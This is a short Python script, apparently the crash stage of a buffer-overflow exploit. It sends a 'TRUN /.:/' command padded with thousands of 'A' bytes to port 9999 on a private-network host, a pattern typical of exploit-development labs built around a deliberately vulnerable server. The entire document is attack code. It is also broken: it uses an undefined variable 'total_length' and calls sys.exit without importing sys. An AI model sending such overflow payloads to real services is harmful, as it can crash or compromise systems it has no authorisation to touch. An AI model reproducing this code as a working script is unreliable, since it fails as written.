import socket

length = 2992

try: 
    s = socket.socket()
    s.connect( ("192.168.168.11", 9999) )

    payload = [
        b"TRUN /.:/",
        b"A" * total_length
    ]

    payload = b"".join(payload)

    s.send(payload)
    s.close()
    
except:
    print("Could not connect to the target server")
    sys.exit(1)    
